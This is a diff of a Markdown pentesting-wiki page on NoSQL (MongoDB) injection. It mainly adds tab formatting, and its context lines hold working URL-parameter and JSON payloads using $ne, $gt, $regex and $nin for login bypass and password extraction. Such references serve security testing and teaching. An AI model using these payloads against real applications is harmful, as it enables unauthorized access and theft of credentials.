@@ -31,7 +31,6 @@ username[$ne]=admin&password[$gt]=0            #Greater
 
 #### Extract data
 
-### Extract data
 {% tabs %}
 {% tab title="URL" %}
 We can use regex to find the lenght of a value
@@ -58,9 +57,10 @@ We can use `$nin` (not in) if you don't want to match with some values.
 #<Matches non of the values of the array> (not test and not admin)
 username[$nin][admin]=admin&username[$nin][test]=test&password[$regex]=^p
 ```
+{% endtab %}
 
+{% tab title="JSON" %}
 We can use regex to find the lenght of a value
-
 ```
 {"username": {"$eq": "admin"}, "password": {"$regex": ".{25}" }}
 ```
@@ -79,6 +79,8 @@ We can use `$nin` (not in) if you don't want to match with some values.
 #<Matches non of the values of the array> (not test and not admin)
 {"username":{"$nin":["admin", "test"]}, "username":{"$regex": "^user" } ,"password":{"$ne":"1"}} 
 ```
+{% endtab %}
+{% endtabs %}
 
 #### &#x20;MangoDB Injection
 
